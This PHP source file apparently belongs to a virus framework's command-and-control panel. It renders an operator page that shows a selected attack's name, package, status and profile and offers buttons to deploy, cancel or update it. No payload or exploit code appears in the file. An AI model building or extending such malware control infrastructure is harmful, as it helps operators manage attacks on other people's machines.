<?php /** @noinspection PhpIncludeInspection */

namespace Kelvinho\Virus\Attack;

use Kelvinho\Virus\Header;
use Kelvinho\Virus\HtmlTemplate;
use Kelvinho\Virus\Logs;
use Kelvinho\Virus\Session;
use Kelvinho\Virus\Timezone;
use Kelvinho\Virus\User;
use function Kelvinho\Virus\formattedTime;

/**
 * Class Renderer, renders admin pages for attacks. Currently, these UI files can be defined:
 *
 * - fields.php
 * - result.php
 * - footnote.php
 * - fields_js.php
 * - js.php
 * - message_dormant
 * - message_deployed
 * - message_executed
 *
 * @package Kelvinho\Virus\Attack
 */
class Renderer {
    public static function render(string $packageDirectory, Session $session, AttackFactory $attackFactory) {
        if (!$session->has("attack_id")) {
            header("Location: " . DOMAIN);
            Header::redirect();
        }
        $attack = $attackFactory->get($session->get("attack_id"));
        ?>
        <html lang="en_US">
        <head>
            <title>Attack info</title>
            <?php echo HtmlTemplate::header(); ?>
        </head>
        <body>

        <h1><a href="<?php echo DOMAIN_VIRUS_INFO; ?>">Attack info</a></h1>
        <br>
        <label for="name">Name</label><input id="name" class="w3-input" type="text"
                                             value="<?php echo $attack->getName(); ?>">
        <br>
        <label>
            Package
            <input class="w3-input" type="text" disabled
                   value="<?php echo PackageRegistrar::getDisplayName($attack->getPackageDbName()); ?>">
        </label>
        <br>
        <label>
            Package description
            <textarea rows="3" cols="80" class="w3-input" disabled
                      style="resize: vertical;"><?php echo PackageRegistrar::getDescription($attack->getPackageDbName()); ?></textarea>
        </label>
        <br>
        <label>
            Hash/id
            <input class="w3-input" type="text" disabled value="<?php echo $attack->getAttackId(); ?>">
        </label>
        <br>
        <label>
            Status
            <input class="w3-input" type="text" disabled value="<?php echo $attack->getStatus();
            if ($attack->getStatus() === AttackInterface::STATUS_EXECUTED) {
                $user = User::get($session->get("user_handle"));
                echo " at " . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone();
            } ?>">
        </label>
        <br>
        <label for="profile">Profile</label><textarea id="profile" rows="6" cols="80" class="w3-input"
                                                      style="resize: vertical;"><?php echo $attack->getProfile(); ?></textarea>
        <br>
        <?php @include($packageDirectory . "/ui/fields.php"); ?>
        <div class="w3-button w3-red" onclick="update()">Update</div>
        <?php
        switch ($attack->getStatus()) {
            case AttackInterface::STATUS_DORMANT: ?>
                <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
                <?php @include($packageDirectory . "/ui/message_dormant.php");
                break;
            case AttackInterface::STATUS_DEPLOYED: ?>
                <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the
                    attack.</p>
                <?php @include($packageDirectory . "/ui/message_deployed.php");
                break;
            case AttackInterface::STATUS_EXECUTED:
                @include $packageDirectory . "/ui/message_executed.php";
                break;
            default:
                Logs::attackStatus($attack->getStatus());
        }
        @include($packageDirectory . "/ui/footnote.php");
        ?>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
        <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
        <script type="application/javascript">
            function update() {
                $.ajax({
                    url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack"; ?>",
                    type: "POST",
                    data: {
                        virus_id: "<?php echo $attack->getVirusId(); ?>",
                        attack_id: "<?php echo $attack->getAttackId(); ?>",
                        name: $("#name").val(),
                        profile: $("#profile").val()
                        <?php @include($packageDirectory . "/ui/fields_js.php"); ?>
                    },
                    success: function (response) {
                        console.log(response);
                        window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                    }
                });
            }

            function deployAttack() {
                $.ajax({
                    url: "<?php echo DOMAIN_CONTROLLER; ?>/deployAttack",
                    type: "POST",
                    data: {
                        virus_id: "<?php echo $attack->getVirusId(); ?>",
                        attack_id: "<?php echo $attack->getAttackId(); ?>"
                    },
                    success: function () {
                        window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>";
                    }
                });
            }

            function cancelAttack() {
                $.ajax({
                    url: "<?php echo DOMAIN_CONTROLLER; ?>/cancelAttack",
                    type: "POST",
                    data: {
                        virus_id: "<?php echo $attack->getVirusId(); ?>",
                        attack_id: "<?php echo $attack->getAttackId(); ?>"
                    },
                    success: function () {
                        window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                    }
                })
            }
        </script>
        <?php @include($packageDirectory . "/ui/js.php"); ?>
        </html>
        <?php
    }
}